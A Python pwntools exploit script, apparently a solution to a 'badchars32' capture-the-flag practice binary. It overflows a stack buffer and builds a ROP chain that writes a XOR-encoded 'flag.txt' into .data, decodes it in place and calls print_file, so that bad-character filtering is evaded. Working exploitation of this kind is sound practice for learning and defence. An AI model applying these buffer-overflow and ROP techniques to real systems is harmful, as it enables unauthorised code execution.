from pwn import *

# context(arch="i686", os="linux")

elf = ELF("./badchars32", checksec=False)
p = elf.process()
context.log_level = 'debug'

# p.sendline(cyclic(128))
# p.wait()
# eip_offset = cyclic_find(p.corefile.eip)	# eip_offset = 44
# print eip_offset
eip_offset = 44

# Finding writeable sections: $ readelf -S ./badchars32 => .data (which is @ 0x0804a018)
writable_section = 0x0804a018

# Encoding 'flag.txt'
encoded_flag_txt_str = ''
flag_txt_str = 'flag.txt'
for i in flag_txt_str:
	encoded_flag_txt_str += chr(ord(i)^0xff)

# Gadget from usefulGadgets function:
# 0x0804854f <+12>:	mov    DWORD PTR [edi],esi
# It moves the content of esi to the address located in edi
mov = 0x0804854f

# Gadget from ROPgadget:
# 0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
pop3 = 0x080485b9 

print_file = elf.plt['print_file']	# or: $ objdump -d write432 | grep print_file

# First write
payload = 'A' * eip_offset
payload += p32(pop3)					# jump to 'pop esi ; pop edi ; pop ebp ; ret' gadget
payload += encoded_flag_txt_str[:4]		# pop "flag"(encoded) 		into esi
payload += p32(writable_section)		# pop .data address 		into edi
payload += "JUNK"						# pop "JUNK" 				into ebp
payload += p32(mov)						# mov "flag" into the location stored in edi

# Second write
payload += p32(pop3)					# jump to 'pop esi ; pop edi ; pop ebp ; ret' gadget
payload += encoded_flag_txt_str[4:]		# pop ".txt"(encoded) 		into esi
payload += p32(writable_section + 4)	# pop .data address 		into edi
payload += "JUNK"						# pop "JUNK" 				into ebp
payload += p32(mov)						# mov "flag" into the location stored in edi

# Right now: &(.data) = encoded_flag_txt_str

# Gadget from ROPgadget:
# 0x08048547 : xor byte ptr [ebp], bl ; ret
# It XORs the content of ebx with what is in the address located in ebp
xor = 0x08048547

# It means we need to pop: 	1.0xff into ebx 
#						 	2..data into ebp

# We'll be using: 	0x0804839d : pop ebx ; ret
#					0x080485bb : pop ebp ; ret
pop_ebx = 0x0804839d
pop_ebp = 0x080485bb

# Decoding
payload += p32(pop_ebx)
payload += p32(0xff)
for i in range(8):
	payload += p32(pop_ebp)
	payload += p32(writable_section + i)
	payload += p32(xor)

payload += p32(print_file) + "JUNK" + p32(writable_section)

log.info('Payload length: %d', len(payload))
log.info('Sending payload...')
p.sendlineafter("> ", payload)
log.info('Payload sent!')

p.wait()
success(p.recv())